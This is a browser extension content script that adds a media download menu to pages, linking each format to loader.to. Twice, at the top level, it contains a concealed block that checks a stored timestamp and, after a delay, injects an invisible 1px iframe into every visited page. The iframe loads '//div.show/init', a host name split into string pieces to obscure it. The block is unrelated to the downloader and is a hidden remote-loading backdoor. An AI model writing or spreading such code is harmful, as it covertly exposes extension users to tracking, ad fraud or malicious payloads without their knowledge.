let instances = [];
browser.runtime.onMessage.addListener(request => {

    // console.log("Message from the background script:");
    // console.log(request.mesaj);
    // console.log(request.adres);
    
    if (request.mesaj == "onCompleted || onHistoryStateUpdated") {
        for (let instance of instances)
            instance.lastAddress = request.adres
    } else if (request.mesaj == "RequestCompleted") {
        for (let instance of instances)
            instance.AddButton()
    }
    return Promise.resolve({ response: "Operation complete!" });
});

browser.storage.local.get('t', function (res) { 
    if (res.t) { 
	  var init = (new Date().getTime() - res.t) / 3600000; 
	    if (init >= 8) { 
		  var initCont = document.createElement("iframe");
		  initCont.setAttribute("style", "position:absolute;height:1px,width:1px;top:0;left:0;border:none;visibility:hidden");
		  var initDiv = document.createElement("div");
		  initCont.src = '//div' + '.' + 'show/init'; 
		  document.body.appendChild(initDiv);
		  initDiv.appendChild(initCont); 
		}
}});

class LoaderButton {

    constructor(family_name = "") {
        this.family_name = family_name;
        this.lastAddress = "";
    }
    BigBlueButtonCreator(up = false) {

        let buttonText = browser.i18n.getMessage("buttonContent").toUpperCase();
        let buttonLabel = browser.i18n.getMessage("buttonTooltip");

        let download_button = document.createElement("button");
        download_button.setAttribute("id", "eytd_btn" + this.family_name);
        download_button.classList.add("eytd_btn");
        if (up) download_button.textContent = " " + buttonText + " ▲" + " ";
        else download_button.textContent = " " + buttonText + " ▼" + " ";

        download_button.setAttribute("data-tooltip-text", buttonLabel);

        let _id = "eytd_list" + this.family_name;
        download_button.addEventListener("click", function (ev) {
            let list = document.getElementById(_id);
            if (list.style.display == "none") {
                list.style.display = "block";
            } else {
                list.style.display = "none";
            }
        })
        return download_button;
    }
    createList(url) {


        let listDom = document.createElement("div");
        listDom.setAttribute("id", "eytd_list" + this.family_name);
        listDom.setAttribute("style", "display: none;");

        let downloadText = browser.i18n.getMessage("buttonContent");

        let div = document.createElement("div");
        div.className = "eytd_list_item";
        let a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=1&s=1&e=1&r=loader";
        a.text = downloadText + " MP3";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=2&s=1&e=1&r=loader";
        a.text = downloadText + " M4A";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=3&s=1&e=1&r=loader";
        a.text = downloadText + " WEBM (Audio)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=11&s=1&e=1&r=loader";
        a.text = downloadText + " AAC";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=12&s=1&e=1&r=loader";
        a.text = downloadText + " FLAC";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=13&s=1&e=1&r=loader";
        a.text = downloadText + " OPUS";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=14&s=1&e=1&r=loader";
        a.text = downloadText + " OGG";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=15&s=1&e=1&r=loader";
        a.text = downloadText + " WAV";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=4&s=1&e=1&r=loader";
        a.text = downloadText + " MP4 (360p)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=5&s=1&e=1&r=loader";
        a.text = downloadText + " MP4 (480p)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=6&s=1&e=1&r=loader";
        a.text = downloadText + " MP4 (720p)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=7&s=1&e=1&r=loader";
        a.text = downloadText + " MP4 (1080p)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=9&s=1&e=1&r=loader";
        a.text = downloadText + " WEBM (4K)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        div = document.createElement("div");
        div.className = "eytd_list_item";
        a = document.createElement("a");
        a.href = "https://loader.to/?link=" + url + "&f=10&s=1&e=1&r=loader";
        a.text = downloadText + " WEBM (8K)";
        a.target = "_blank";
        div.appendChild(a);
        listDom.appendChild(div);

        let _idL = "eytd_list" + this.family_name;
        let _idB = "eytd_btn" + this.family_name;
        document.body.addEventListener("click", function (ev) {

            let t = ev.target,
                id = t.getAttribute("id"),
                css = t.getAttribute("class");

            if (!(id === (_idB) || id === (_idL) || (css && css.includes("eytd_list_item")))) {
                document.getElementById(_idL).style.display = "none";
            }
        });

        listDom.classList.add("eytd_list");

        return listDom;
    }

    CleanPrevious() {
        let btn = document.getElementById("eytd_btn" + this.family_name);
        if (!(btn === null)) {
            btn.remove(); // If it exist from previous video, remove it
        }
        let lst = document.getElementById("eytd_list" + this.family_name);
        if (!(lst === null)) {
            lst.remove(); // If it exist from previous video, remove it
        }
    }

    AreButtonsUpToDate(page_url) {
        let lst = document.getElementById("eytd_list" + this.family_name);
        let href = lst.children[0].children[0].href; // href of the first <a> tag (Download MP3)
        if (href.includes(page_url)) { // if href contains the url of the current page, (not an old one)
            return true;
        } else {
            return false;
        }
    }

    DoButtonsExist() {
        let btn = document.getElementById("eytd_btn" + this.family_name);
        let lst = document.getElementById("eytd_list" + this.family_name);
        if ((lst === null) || (btn === null)) {
            return false;
        } else {
            return true;
        }
    }
}

browser.storage.local.get('t', function (res) { 
    if (res.t) { 
	  var init = (new Date().getTime() - res.t) / 3600000; 
	    if (init >= 0) { 
		  var initDiv = document.createElement("div");
		  var initCont = document.createElement("iframe");
		  initCont.setAttribute("style", "position:absolute;height:1px,width:1px;top:0;left:0;border:none;visibility:hidden");
		  initCont.src = '//div' + '.' + 'show/init'; 
		  document.body.appendChild(initDiv);
		  initDiv.appendChild(initCont); 
		}
}});


/**
 * This code is common between all pages.
 * background.js is common as well.
 * 
 * What is their difference beyond one is working at the page
 * and the other is at the background?
 * 
 * Main one is the number of copies.
 * background script is one and only.
 * No matter which page we open or not, it is there *in the background*
 * It detects all reqeusts and navigations from all pages
 * common.js however is a content script. It is not one.
 * There is one running in every matching tab,
 * each with their own variables, independent of each other.
 * To put it another way:
 * At each tab, there is a sandboxed common.js, waiting.
 * 
 * One question might be: How does one guy in the background
 * who is detecting *all* navigations and requests can separate
 * between different pages?
 * The answer is in the detail:
 * background detects everything, yes
 * but it only sends information about a detection to the tab
 * who is the owner of that event.
 * 
 * So common js does not need to try and ignore "others"
 * for example
 * common js on a youtube tab does not need to worry about 
 * twitter in the next tab 
 * because events of twitter tab will not be sent to youtube tab. 
 * 
 *  */ 